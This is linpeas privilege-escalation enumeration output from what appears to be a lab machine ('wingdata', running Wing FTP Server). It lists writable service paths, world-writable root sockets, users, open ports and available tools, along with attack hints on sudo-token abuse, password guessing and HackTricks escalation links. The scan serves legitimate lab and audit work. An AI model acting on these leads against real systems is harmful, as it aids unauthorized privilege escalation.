[1;32msystemd-sysctl.service[0m             loaded active exited  Apply Kernel Variables
[1;32msystemd-sysusers.service[0m           loaded active exited  Create System Users
  Potential issue in service file: /lib/systemd/system/systemd-sysusers.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-sysusers.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
[1;32msystemd-timesyncd.service[0m          loaded active running Network Time Synchronization
[1;32msystemd-tmpfiles-setup-dev.service[0m loaded active exited  Create Static Device Nodes in /dev
[1;32msystemd-tmpfiles-setup.service[0m     loaded active exited  Create System Files and Directories
[1;32msystemd-udev-trigger.service[0m       loaded active exited  Coldplug All udev Devices
  Potential issue in service file: /lib/systemd/system/systemd-udev-trigger.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-udev-trigger.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
[1;32msystemd-udevd.service[0m              loaded active running Rule-based Manager for Device Events and Files
  Potential issue in service file: /lib/systemd/system/systemd-udevd.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32msystemd-update-utmp.service[0m        loaded active exited  Record System Boot/Shutdown in UTMP
[1;32msystemd-user-sessions.service[0m      loaded active exited  Permit User Sessions
[1;32mvmware-tools.service[0m               loaded active running LSB: VMware Tools service
[1;32mwftpserver.service[0m                 loaded active running Wing FTP Server daemon
[1;32mLOAD[0m   = Reflects whether the unit definition was properly loaded.
[1;32mACTIVE[0m = The high-level unit activation state, i.e. generalization of SUB.
[1;32mSUB[0m    = The low-level unit activation state, values depend on unit type.
[1;32m31[0m loaded units listed.

[1;34m══╣ [1;32mDisabled services: [1;90m(T1543.002,T1007)
[0m[1;32mapache-htcacheclean.service[0m            disabled enabled
[1;32mapache-htcacheclean@.service[0m           disabled enabled
[1;32mapache2@.service[0m                       disabled enabled
[1;32mconsole-getty.service[0m                  disabled disabled
[1;32mdebug-shell.service[0m                    disabled disabled
[1;32mifupdown-wait-online.service[0m           disabled enabled
[1;32mnftables.service[0m                       disabled enabled
[1;32mserial-getty@.service[0m                  disabled enabled
[1;32msystemd-boot-check-no-failures.service[0m disabled disabled
[1;32msystemd-network-generator.service[0m      disabled enabled
[1;32msystemd-networkd-wait-online.service[0m   disabled disabled
[1;32msystemd-networkd-wait-online@.service[0m  disabled enabled
[1;32msystemd-sysext.service[0m                 disabled enabled
  Potential issue in service file: /lib/systemd/system/systemd-sysext.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32msystemd-time-wait-sync.service[0m         disabled disabled
[1;32m14[0m unit files listed.

[1;34m══╣ [1;32mAdditional service files: [1;90m(T1543.002,T1007)
[0m  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/networking.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/network-online.target.wants/networking.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32mYou can't write on systemd PATH[0m

[1;34m╔══════════╣ [1;32mSystemd Information [1;90m(T1543.002)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
[0m[1;34m═╣ [1;32mSystemd version and vulnerabilities? .............. [0m[0m[1;31m252.39[0m
[1;34m═╣ [1;32mServices running as root? ..... [0m[0m
[1;34m═╣ [1;32mRunning services with dangerous capabilities? ... [0m[0m
[1;34m═╣ [1;32mServices with writable paths? . [0m[0m[1;31mwftpserver.service: /opt/wftpserver/wftpserver (from ExecStart=/opt/wftpserver/wftpserver)[0m

[1;34m╔══════════╣ [1;32mSystemd PATH [1;90m(T1543.002)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
[0mPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[1;34m╔══════════╣ [1;32mAnalyzing .socket files [1;90m(T1559)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
[0m
[1;34m╔══════════╣ [1;32mUnix Sockets Analysis [1;90m(T1571,T1049)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
[0m[1;31m/run/dbus/system_bus_socket[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;32m/run/systemd/fsck.progress[0m
[1;32m/run/systemd/inaccessible/sock[0m
[1;31m/run/systemd/io.system.ManagedOOM[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/systemd/journal/dev-log[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;32m/run/systemd/journal/io.systemd.journal[0m
[1;31m/run/systemd/journal/socket[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/systemd/journal/stdout[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/systemd/notify[0m
  └─([1;31mRead Write Execute (Weak Permissions: 777) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;32m/run/systemd/private[0m
[1;31m/run/systemd/userdb/io.systemd.DynamicUser[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;32m/run/udev/control[0m
[1;31m/run/vmware/guestServicePipe[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/var/run/vmware/guestServicePipe[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m

[1;34m╔══════════╣ [1;32mD-Bus Analysis [1;90m(T1559.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
[0m[1;32mNAME[0m                        PID PROCESS         USER             CONNECTION    UNIT                      SESSION DESCRIPTION
[1;32m:1.0[0m                       2243 [1;34msys[0mtemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -
[1;32m:1.1[0m                          1 [1;34msys[0mtemd         [1;31mroot[0m             :1.1          init.scope                -       -
[1;32m:1.2[0m                       2778 [1;34msys[0mtemd-logind  [1;31mroot[0m             :1.2          systemd-logind.service    -       -
[1;32m:1.343[0m                    31163 busctl          [1;95mwingftp[0m          :1.343        wftpserver.service        -       -
[1;32morg.freedesktop.DBus[0m          1 [1;34msys[0mtemd         [1;31mroot[0m             -             init.scope                -       -
[1;32morg.freedesktop.hostname1[0m     - -               -                (activatable) -                         -       -
[1;32morg.freedesktop.locale1[0m       - -               -                (activatable) -                         -       -
[1;32morg.freedesktop.login1[0m     2778 [1;34msys[0mtemd-logind  [1;31mroot[0m             :1.2          systemd-logind.service    -       -
[1;32morg.freedesktop.network1[0m      - -               -                (activatable) -                         -       -
[1;32morg.freedesktop.[1;34msys[0mtemd1[0m      1 systemd         [1;31mroot[0m             :1.1          init.scope                -       -
[1;32morg.freedesktop.timedate1[0m     - -               -                (activatable) -                         -       -
[1;32morg.freedesktop.time[1;34msync[0m1[0m  2243 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -

[1;34m╔══════════╣ [1;32mD-Bus Configuration Files [1;90m(T1559.001)
[0mActivation definitions in /usr/share/dbus-1/services:
/usr/share/dbus-1/services/org.freedesktop.systemd1.service:11:Name=org.freedesktop.systemd1
/usr/share/dbus-1/services/org.freedesktop.systemd1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/services/org.freedesktop.systemd1.service:13:[1;31mUser=[0mUser=[0mroot
Activation definitions in /usr/share/dbus-1/system-services:
/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:11:Name=org.freedesktop.timedate1
/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.network1.service:11:Name=org.freedesktop.network1
/usr/share/dbus-1/system-services/org.freedesktop.network1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.network1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.login1.service:11:Name=org.freedesktop.login1
/usr/share/dbus-1/system-services/org.freedesktop.login1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.login1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.timesync1.service:11:Name=org.freedesktop.timesync1
/usr/share/dbus-1/system-services/org.freedesktop.timesync1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.timesync1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:11:Name=org.freedesktop.systemd1
/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:11:Name=org.freedesktop.locale1
/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:9:Name=org.freedesktop.hostname1
/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:10:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:11:[1;31mUser=[0mUser=[0mroot

[1;34m══╣ [1;32mD-Bus Session Bus Analysis [1;90m(T1559.001)
[0m([1;32mAccess to session bus available[0m)


[1;34m╔══════════╣ [1;32mLegacy r-commands (rsh/rlogin/rexec) and host-based trust [1;90m(T1021.004)
[0m
[1;34m══╣ [1;32mListening r-services (TCP 512-514) [1;90m(T1021.004)
[0m
[1;34m══╣ [1;32msystemd units exposing r-services [1;90m(T1021.004)
[0m[1;90mrlogin|rsh|rexec units Not Found
[0m
[1;34m══╣ [1;32minetd/xinetd configuration for r-services [1;90m(T1021.004)
[0m[1;90m/etc/inetd.conf Not Found
[0m[1;90m/etc/xinetd.d Not Found
[0m
[1;34m══╣ [1;32mInstalled r-service server packages [1;90m(T1021.004)
[0m  No related packages found via dpkg

[1;34m══╣ [1;32m/etc/hosts.equiv and /etc/shosts.equiv [1;90m(T1021.004)
[0m
[1;34m══╣ [1;32mPer-user .rhosts files [1;90m(T1021.004)
[0m[1;90m.rhosts Not Found
[0m
[1;34m══╣ [1;32mPAM rhosts authentication [1;90m(T1021.004)
[0m[1;90m/etc/pam.d/rlogin|rsh Not Found
[0m
[1;34m══╣ [1;32mSSH HostbasedAuthentication [1;90m(T1021.004)
[0m  HostbasedAuthentication no or not set

[1;34m══╣ [1;32mPotential DNS control indicators (local) [1;90m(T1021.004)
[0m  Not detected

[1;34m╔══════════╣ [1;32mCrontab UI (root) misconfiguration checks [1;90m(T1053.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
[0m[1;90mcrontab-ui Not Found
[0m[1;34m╔══════════╣ [1;32mDeleted files still open [1;90m(T1083)
[0m[1;34m╚ [1;34m[3mOpen deleted files can hide tools and still consume disk space
[0m
[1;34m╔══════════╣ [1;32mDeleted executables still running [1;90m(T1083)
[0m[1;34m╚ [1;34m[3mA deleted /proc/<PID>/exe may indicate tampering, cleanup, or a useful runtime-only binary
[0m


[1;34m                              ╔═════════════════════╗
══════════════════════════════╣ [1;32mNetwork Information[1;34m ╠══════════════════════════════
[1;34m                              ╚═════════════════════╝[0m
[1;34m╔══════════╣ [1;32mInterfaces [1;90m(T1016)
[0mdefault		0.0.0.0
loopback	127.0.0.0
link-local	169.254.0.0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.3.192  netmask 255.255.0.0  broadcast 10.129.255.255
        ether 00:50:56:b9:5d:d9  txqueuelen 1000  (Ethernet)
        RX packets 1032  bytes 1140416 (1.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 740  bytes 102433 (100.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20  bytes 4795 (4.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 4795 (4.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[1;34m══╣ [1;32mRouting & policy quick view [1;90m(T1016)
[0mdefault via 10.129.0.1 dev eth0 
10.129.0.0/16 dev eth0 proto kernel scope link src 10.129.3.192 

0:	from all lookup local
32766:	from all lookup main
32767:	from all lookup default
[1;34m══╣ [1;32mVirtual/overlay interfaces quick view [1;90m(T1016)
[0m1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000
[1;34m══╣ [1;32mNetwork namespaces quick view [1;90m(T1016)
[0m[1;34m══╣ [1;32mForwarding status [1;90m(T1016)
[0mnet.ipv4.ip_forward = 0
net.ipv6.conf.all.forwarding = 0

[1;34m╔══════════╣ [1;32mHostname, hosts and DNS [1;90m(T1016,T1018)
[0m[1;34m══╣ [1;32mHostname Information [1;90m(T1016,T1018)
[0mSystem hostname: wingdata
FQDN: wingdata

[1;34m══╣ [1;32mHosts File Information [1;90m(T1016,T1018)
[0mContents of /etc/hosts:
  127.0.0.1	localhost
  127.0.1.1	wingdata
  ::1     localhost ip6-localhost ip6-loopback
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

[1;34m══╣ [1;32mDNS Configuration [1;90m(T1016,T1018)
[0mDNS Servers (resolv.conf):
  1.1.1.1
  8.8.8.8
-e 
DNS Domain Information:
(none)

[1;34m╔══════════╣ [1;32mActive Ports [1;90m(T1049)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
[0m[1;34m══╣ [1;32mActive Ports (netstat) [1;90m(T1049)
[0mtcp        0      0 [1;31m0.0.0.0[0m:35889           [1;31m0.0.0.0[0m:*               LISTEN      3561/wftpserver     
tcp        0      0 [1;31m0.0.0.0[0m:5466            [1;31m0.0.0.0[0m:*               LISTEN      3561/wftpserver     
tcp        0      0 [1;31m0.0.0.0[0m:80              [1;31m0.0.0.0[0m:*               LISTEN      -                   
tcp        0      0 [1;31m0.0.0.0[0m:22              [1;31m0.0.0.0[0m:*               LISTEN      -                   
tcp        0      0 [1;31m127.0.0.1[0m:8080          [1;31m0.0.0.0[0m:*               LISTEN      3561/wftpserver     
tcp6       0      0 [1;31m:::[0m5466                 [1;31m:::[0m*                    LISTEN      3561/wftpserver     
tcp6       0      0 [1;31m:::[0m22                   [1;31m:::[0m*                    LISTEN      -                   
[1;34m══╣ [1;32mLocal-only listeners (loopback) [1;90m(T1049)
[0mtcp   LISTEN 0      128        [1;31m127.0.0.1:[0m8080       0.0.0.0:*    users:(("sed",pid=31423,fd=11),("grep",pid=31422,fd=11),("ss",pid=31421,fd=11),("linpeas.sh",pid=3671,fd=11),("timeout",pid=3670,fd=11),("bash",pid=3661,fd=11),("bash",pid=3660,fd=11),("sh",pid=3658,fd=11),("wftpserver",pid=3561,fd=11))
[1;34m══╣ [1;32mUnique listener bind addresses [1;90m(T1049)
[0m::
0.0.0.0
[1;31m127.0.0.1[0m
[1;34m══╣ [1;32mPotential local forwarders/relays [1;90m(T1049)
[0mwingftp    31432  0.0  0.0   6420  1016 ?        S    02:53   0:00 sed -E s,[1;31;103msocat[0m|[1;31;103mssh[0m|[1;31;103m-L[0m|[1;31;103m-R[0m|[1;31;103m-D[0m|[1;31;103mncat[0m|[1;31;103mnc[0m,?[1;31;103m&?[0m,g

[1;34m╔══════════╣ [1;32mNetwork Traffic Analysis Capabilities [1;90m(T1040)
[0m
[1;34m══╣ [1;32mAvailable Sniffing Tools [1;90m(T1040)
[0m[1;31mNo sniffing tools found[0m

[1;34m══╣ [1;32mNetwork Interfaces Sniffing Capabilities [1;90m(T1040)
[0mInterface lo (loopback): [1;31mNot sniffable[0m
Interface eth0: [1;31mNot sniffable[0m
[1;31mNo sniffable interfaces found[0m

[1;34m══╣ [1;32mRunning sniffing/traffic reconstruction processes [1;90m(T1040)
[0m
[1;34m╔══════════╣ [1;32mFirewall Rules Analysis [1;90m(T1016)
[0m
[1;34m══╣ [1;32mIptables Rules [1;90m(T1016)
[0m[1;31mNo permission to list iptables rules[0m

[1;34m══╣ [1;32mNftables Rules [1;90m(T1016)
[0m[1;31mNo permission to list nftables rules[0m

[1;34m══╣ [1;32mFirewalld Rules [1;90m(T1016)
[0m[1;90mfirewalld Not Found
[0m
[1;34m══╣ [1;32mUFW Rules [1;90m(T1016)
[0m[1;90mufw Not Found
[0m
[1;34m══╣ [1;32mForwarding and rp_filter [1;90m(T1016)
[0mnet.ipv4.ip_forward = 0
net.ipv6.conf.all.forwarding = 0
net.ipv4.conf.all.rp_filter = 0

[1;34m╔══════════╣ [1;32mInetd/Xinetd Services Analysis [1;90m(T1049)
[0m
[1;34m══╣ [1;32mInetd Services [1;90m(T1049)
[0m[1;90minetd Not Found
[0m
[1;34m══╣ [1;32mXinetd Services [1;90m(T1049)
[0m[1;90mxinetd Not Found
[0m
[1;34m══╣ [1;32mRunning Inetd/Xinetd Services [1;90m(T1049)
[0mActive Services (from netstat):
-e 
Active Services (from ss):
-e 
Running Service Processes:

[1;34m╔══════════╣ [1;32mInternet Access? [1;90m(T1016,T1590)
[0mDNS is not accessible
Port 80 is not accessible
Port 443 is not accessible
ICMP is not accessible
Port 443 is not accessible with curl

[1;34m══╣ [1;32mProxy discovery [1;90m(T1016,T1590)
[0m[1;34m╚ [1;34m[3mChecking common proxy env vars and apt proxy config
[0m


[1;34m                               ╔═══════════════════╗
═══════════════════════════════╣ [1;32mUsers Information[1;34m ╠═══════════════════════════════
[1;34m                               ╚═══════════════════╝[0m
[1;34m╔══════════╣ [1;32mMy user [1;90m(T1033)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
[0muid=1000([1;96m[1;95mwingftp[0m[0m) gid=1000([1;96m[1;95mwingftp[0m[0m) groups=1000([1;96m[1;95mwingftp[0m[0m),24[1;32m(cdrom)[0m,25(floppy),29(audio),30(dip),44[1;31m(video)[0m,46[1;32m(plugdev)[0m,100(users),106(netdev)

[1;34m╔══════════╣ [1;32mPGP Keys and Related Files [1;90m(T1552.004)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys
[0m[1;96mGPG:[0m
GPG is installed, listing keys:
[1;96m-e [0m
[1;96mNetPGP:[0m
[1;90mnetpgpkeys Not Found
[0m[1;96m-e [0m
[1;96mPGP Related Files:[0m

[1;34m╔══════════╣ [1;32mChecking 'sudo -l', /etc/sudoers, and /etc/sudoers.d [1;90m(T1548.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
[0m
No cached sudo token (sudo -n -l)

ICMP is not accessible

[1;34m╔══════════╣ [1;32mChecking sudo tokens [1;90m(T1548.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens
[0mptrace protection [1;31mis disabled[0m (0), so sudo tokens could be abused
[1;96mSudo token directory perms:[0m
drwx------ 2 root root 60 Jun 14 02:53 /var/run/sudo/ts

[1;90mdoas.conf Not Found
[0m
[1;34m╔══════════╣ [1;32mChecking Pkexec and Polkit [1;90m(T1548.003,T1548.004,T1068)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2
[0m
[1;34m══╣ [1;32mPolkit Binary [1;90m(T1548.003,T1068)
[0m
[1;34m══╣ [1;32mPolkit Policies [1;90m(T1548.003)
[0m[1;96mChecking /usr/share/polkit-1/rules.d/:[0m
// This file is part of [1;34msys[0mtemd.
// See [1;34msystemd-network[0md.service(8) and polkit(8) for more information.

// Allow [1;34msystemd-network[0md to set timezone, get product UUID,
// and transient hostname
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
         action.id == "org.freedesktop.hostname1.get-product-uuid" ||
         action.id == "org.freedesktop.timedate1.set-timezone") &&
        subject.user == "[1;34msystemd-network[0m") {
        return polkit.Result.YES;
    }
});

[1;34m══╣ [1;32mPolkit Authentication Agent [1;90m(T1548.004)
[0m
[1;34m╔══════════╣ [1;32mSuperusers and UID 0 Users [1;90m(T1087.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html
[0m
[1;34m══╣ [1;32mUsers with UID 0 in /etc/passwd [1;90m(T1087.001)
[0m[1;31mroot[0m:x:0:0:[1;31mroot[0m:/[1;31mroot[0m:/bin/bash

[1;34m══╣ [1;32mUsers with sudo privileges in sudoers [1;90m(T1087.001)
[0m
[1;34m╔══════════╣ [1;32mUsers with console [1;90m(T1087.001)
[0m[1;31mroot[0m:x:0:0:root:/root:/bin/bash
[1;96mwacky[0m:x:1001:1001::/home/wacky:/bin/bash
[1;96m[1;95mwingftp[0m[0m:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash

[1;34m╔══════════╣ [1;32mAll users & groups [1;90m(T1087.001,T1069.001)
[0muid=0[1;31m([1;31mroot[0m)[0m gid=0[1;31m(root)[0m groups=0[1;31m(root)[0m
uid=1000([1;96m[1;95mwingftp[0m[0m) gid=1000([1;96m[1;95mwingftp[0m[0m) groups=1000([1;96m[1;95mwingftp[0m[0m),24[1;32m(cdrom)[0m,25(floppy),29(audio),30(dip),44[1;31m(video)[0m,46[1;32m(plugdev)[0m,100(users),106(netdev)
uid=1001([1;96mwacky[0m) gid=1001([1;96mwacky[0m) groups=1001([1;96mwacky[0m)
uid=100([1;34mmessagebus[0m) gid=107([1;34mmessagebus[0m) groups=107([1;34mmessagebus[0m)
uid=101([1;34msshd[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=10([1;34muucp[0m) gid=10([1;34muucp[0m) groups=10([1;34muucp[0m)
uid=13([1;34mproxy[0m) gid=13([1;34mproxy[0m) groups=13([1;34mproxy[0m)
uid=1([1;34m[1;32mdaemon[0m[0m) gid=1([1;34m[1;32mdaemon[0m[0m) groups=1([1;34m[1;32mdaemon[0m[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33([1;34m[1;32mwww-data[0m[0m) gid=33([1;34m[1;32mwww-data[0m[0m) groups=33([1;34m[1;32mwww-data[0m[0m)
uid=34([1;34mbackup[0m) gid=34([1;34mbackup[0m) groups=34([1;34mbackup[0m)
uid=38([1;34mlist[0m) gid=38([1;34mlist[0m) groups=38([1;34mlist[0m)
uid=39([1;34mirc[0m) gid=39([1;34mirc[0m) groups=39([1;34mirc[0m)
uid=3([1;34msys[0m) gid=3([1;34msys[0m) groups=3([1;34msys[0m)
uid=42([1;34m_apt[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=4([1;34msync[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=5([1;34mgames[0m) gid=60([1;34mgames[0m) groups=60([1;34mgames[0m)
uid=65534([1;34mnobody[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=6([1;34mman[0m) gid=12([1;34mman[0m) groups=12([1;34mman[0m)
uid=7([1;34mlp[0m) gid=7([1;34mlp[0m) groups=7([1;34mlp[0m)
uid=8([1;34m[1;32mmail[0m[0m) gid=8([1;34m[1;32mmail[0m[0m) groups=8([1;34m[1;32mmail[0m[0m)
uid=997([1;34msystemd-timesync[0m) gid=997([1;34msystemd-timesync[0m) groups=997([1;34msystemd-timesync[0m)
uid=998([1;34msystemd-network[0m) gid=998([1;34msystemd-network[0m) groups=998([1;34msystemd-network[0m)
uid=999([1;34m_laurel[0m) gid=996([1;34m_laurel[0m) groups=996([1;34m_laurel[0m)
uid=9([1;34mnews[0m) gid=9([1;34mnews[0m) groups=9([1;34mnews[0m)

[1;34m╔══════════╣ [1;32mCurrently Logged in Users [1;90m(T1033)
[0m
[1;34m══╣ [1;32mBasic user information [1;90m(T1033)
[0m 02:53:35 up 8 min,  0 user,  load average: 0.80, 0.28, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[1;34m══╣ [1;32mActive sessions [1;90m(T1033)
[0m 02:53:35 up 8 min,  0 user,  load average: 0.80, 0.28, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[1;34m══╣ [1;32mLogged in users (utmp) [1;90m(T1033)
[0m           [1;34msys[0mtem boot  2026-06-14 02:44
           run-level 5  2026-06-14 02:44
LOGIN      tty1         2026-06-14 02:44              3545 id=tty1

[1;34m══╣ [1;32mSSH sessions [1;90m(T1033)
[0m
[1;34m══╣ [1;32mScreen sessions [1;90m(T1033)
[0m
[1;34m══╣ [1;32mTmux sessions [1;90m(T1033)
[0m
[1;34m╔══════════╣ [1;32mLast Logons and Login History [1;90m(T1033)
[0m
[1;34m══╣ [1;32mLast logins [1;90m(T1033)
[0mreboot   [1;34msys[0mtem boot  6.1.0-42-amd64   Sun Jun 14 02:44   still running
reboot   [1;34msys[0mtem boot  6.1.0-42-amd64   Mon May 11 09:16 - 09:17  (00:01)
[1;96mwacky[0m    pts/0        10.10.14.5       Mon Feb  9 09:36 - 09:38  (00:02)
reboot   [1;34msys[0mtem boot  6.1.0-42-amd64   Mon Feb  9 09:35 - 09:38  (00:03)
[1;96mwacky[0m    pts/0        10.10.14.5       Mon Feb  9 04:59 - 05:15  (00:16)
reboot   [1;34msys[0mtem boot  6.1.0-42-amd64   Mon Feb  9 04:57 - 05:15  (00:18)
[1;96mwacky[0m    pts/0        10.10.14.64      Thu Jan 22 05:17 - 05:17  (00:00)
reboot   [1;34msys[0mtem boot  6.1.0-42-amd64   Thu Jan 22 05:16 - 05:18  (00:01)
[1;96mwacky[0m    pts/0        10.10.14.64      Thu Jan 22 05:08 - 05:16  (00:07)
reboot   [1;34msys[0mtem boot  6.1.0-42-amd64   Thu Jan 22 05:07 - 05:16  (00:08)

wtmp begins Thu Jan 22 05:07:17 2026

[1;34m══╣ [1;32mFailed login attempts [1;90m(T1033)
[0m
[1;34m══╣ [1;32mRecent logins from auth.log (limit 20) [1;90m(T1033)
[0m
[1;34m══╣ [1;32mLast time logon each user [1;90m(T1033)
[0mUsername         Port     From                                       Latest
[1;96mwacky[0m            pts/0    10.10.14.5                                Mon Feb  9 09:36:36 -0500 2026

[1;34m╔══════════╣ [1;32mDo not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
[0m
[0m[1;34m╔══════════╣ [1;32mDo not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
[0m
[0m[1;34m╔══════════╣ [1;32mActual Group Memberships via newgrp [1;90m(T1069.001)
[0m


[1;34m                             ╔══════════════════════╗
═════════════════════════════╣ [1;32mSoftware Information[1;34m ╠═════════════════════════════
[1;34m                             ╚══════════════════════╝[0m
[1;34m╔══════════╣ [1;32mUseful software [1;90m(T1082)
[0m/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/make
/usr/bin/nc
/usr/bin/nc.traditional
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/local/bin/python3
/usr/bin/sudo
/usr/bin/wget

[1;34m╔══════════╣ [1;32mInstalled Compilers [1;90m(T1587.001)
[0mii  g++                             4:12.2.0-3                     amd64        GNU C++ compiler
ii  g++-12                          12.2.0-14+deb12u1              amd64        GNU C++ compiler
ii  gcc                             4:12.2.0-3                     amd64        GNU C compiler
ii  gcc-12                          12.2.0-14+deb12u1              amd64        GNU C compiler
ii  rpcsvc-proto                    1.4.3-1                        amd64        RPC protocol compiler and definitions
/usr/bin/gcc

[1;34m╔══════════╣ [1;32mAnalyzing Apache-Nginx Files (limit 70)
[0mApache version: Server version: Apache/2.4.66 (Debian)
Server built:   2025-12-05T18:54:44
[1;90mhttpd Not Found
[0m
Nginx version: [1;90mnginx Not Found
[0m
[1;34m══╣ [1;32mPHP exec extensions
